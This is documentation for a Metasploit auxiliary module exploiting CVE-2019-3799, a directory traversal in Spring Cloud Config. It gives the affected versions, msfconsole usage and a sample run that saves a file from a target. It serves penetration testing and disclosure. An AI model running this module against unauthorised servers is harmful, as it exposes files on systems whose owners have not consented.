## Vulnerable Application

his module exploits an unauthenticated directory traversal vulnerabilitywhich exists in spring cloud config, versions 2.1.x prior to 2.1.2,versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6, which islistening by default on port 8888.

<b>Related links :</b>

* https://pivotal.io/security/cve-2019-3799

## Verification

```
Start msfconsole
use auxiliary/scanner/http/springcloud_traversal
set RHOSTS
run
```

## Scenarios

```
msf > use auxiliary/scanner/http/springcloud_traversal 
msf auxiliary(scanner/http/springcloud_traversal) > set RHOSTS 192.168.1.132
RHOSTS => 192.168.1.132
msf auxiliary(scanner/http/springcloud_traversal) > run

[+] File saved in: /home/input0/.msf4/loot/20190418203756_default_192.168.1.132_springcloud.trav_893434.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/springcloud_traversal) >
```

<b>Tested against :</b><br>
`Linux zero 4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux`

<b>Vulnerable software link :</b>
* https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.1.RELEASE.zip
